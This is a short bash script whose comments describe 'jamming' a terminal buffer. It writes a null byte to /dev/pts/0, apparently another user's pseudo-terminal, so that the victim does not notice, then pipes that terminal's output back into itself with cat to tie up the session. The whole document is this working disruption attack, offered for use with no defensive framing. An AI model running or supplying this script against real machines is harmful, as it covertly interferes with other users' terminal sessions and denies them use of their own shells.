#!/bin/bash
#
# Enter null byte into buffer so no one noes you jammed it.
# Then start buffer jamming, so it will always start with a minimum of 1
# character even if it's a non printable charcater.
#
echo -n -e "\c">/dev/pts/0;
cat /dev/pts/0>/dev/pts/0;
